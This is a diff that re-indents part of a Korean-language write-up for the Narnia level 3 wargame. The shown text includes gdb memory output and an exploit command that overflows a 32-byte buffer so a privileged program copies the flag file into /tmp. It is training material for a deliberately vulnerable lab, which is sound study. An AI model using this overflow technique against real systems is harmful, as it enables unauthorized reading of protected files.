@@ -20,7 +20,7 @@ usage, ./narnia3 file, will send contents of file 2 /dev/null
 	(gdb) r NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 	Starting program: /narnia/narnia3 NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
 	...
-    (gdb) x/100s $ebp-0x38
+        (gdb) x/100s $ebp-0x38
 	0xffffd350:     'N' <repeats 32 times>
 	0xffffd371:     "dev/null"
 	0xffffd37a:     ""
@@ -46,6 +46,6 @@ usage, ./narnia3 file, will send contents of file 2 /dev/null
 - 프로그램 실행 시 심볼릭 링크를 실행 인자[32byte + 임시파일]로 입력하면 /dev/null 대신 임시파일에 flag값이 복사됨
 ```
     narnia3@gibson:/narnia$ ./narnia3 /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi
-copied contents of /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi to a safer place... (/tmp/g4nzzi)
-	narnia3@gibson:/narnia$ cat /tmp/g4nzzi
+    copied contents of /tmp/NNNNNNNNNNNNNNNNNNNNNNNNNNN/tmp/g4nzzi to a safer place... (/tmp/g4nzzi)
+    narnia3@gibson:/narnia$ cat /tmp/g4nzzi
 ```
